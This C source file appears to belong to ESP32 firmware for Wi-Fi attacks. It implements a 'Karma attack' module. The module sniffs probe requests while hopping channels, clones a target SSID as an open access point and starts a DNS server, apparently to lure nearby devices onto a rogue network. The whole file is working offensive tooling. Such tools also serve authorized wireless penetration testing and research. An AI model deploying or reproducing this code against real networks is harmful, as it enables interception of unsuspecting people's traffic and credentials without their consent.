#include <string.h>
#include "esp_log.h"
#include "wifiMng.h"
#include "karma_attack.h"
#include "sniffer.h"
#include "dns.h"
#include "target.h"


/* Store target information */
static const char *TAG = "KARMA_ATTACK";

/* Karma Attack Current Status */
static karma_attack_status_t current_status = KARMA_ATTACK_STATUS_IDLE;

/* Karma Attack Status Strings */
static const char* karma_attack_status_string[KARMA_ATTACK_STATUS_MAX] = {
    "KARMA_ATTACK_STATUS_IDLE",
    "KARMA_ATTACK_STATUS_PROBE_SCANNING",
    "KARMA_ATTACK_STATUS_SOFTAP"
};


void karma_attack_set_target(const target_info_t *target)
{
    if(target == NULL) return;

    target_info_t *karma_target = target_get(TARGET_INFO_KARMA_ATTACK);
    memcpy(karma_target, target, sizeof(target_info_t));

    /* Stop sniffer */
    wifi_stop_sniffing();

    /* Start DNS Server */
    dns_server_start();

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = karma_target->channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
                    .capable = true
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&karma_target->ssid);
    wifi_ap_clone(&wifi_config, NULL);

    current_status = KARMA_ATTACK_STATUS_SOFTAP;
    ESP_LOGI(TAG, "Karma target set to SSID: %s on Channel %d.", karma_target->ssid, karma_target->channel);
}


void karma_attack_stop(void)
{
    /* Stop DNS Server */
    dns_server_stop();
    /* Stop sniffer and beacon tracking */
    wifi_stop_sniffing();
    /* Wait engine stop */
    vTaskDelay(pdMS_TO_TICKS(1000));
    /* Restore original hotspot */
    wifi_start_softap();

    current_status = KARMA_ATTACK_STATUS_IDLE;
    ESP_LOGI(TAG, "Karma attack stopped.");
}


void karma_attack_probes_scan_start(void)
{
    wifi_start_sniffing(NULL, SNIFF_MODE_ATTACK_KARMA);
    wifi_sniffer_start_channel_hopping(0);

    current_status = KARMA_ATTACK_STATUS_PROBE_SCANNING;
    ESP_LOGI(TAG, "Karma attack probe scan started.");
}


void karma_attack_probes_scan_stop(void)
{
    wifi_stop_sniffing();

    current_status = KARMA_ATTACK_STATUS_IDLE;
    ESP_LOGI(TAG, "Karma attack probe scan stopped.");
}


karma_attack_status_t karma_attack_get_status(void) 
{
    return current_status;
}


const char* karma_attack_get_status_string(void)
{
    if(current_status >= KARMA_ATTACK_STATUS_MAX || current_status < 0) {
        return "ERROR";
    }
    return karma_attack_status_string[current_status];
}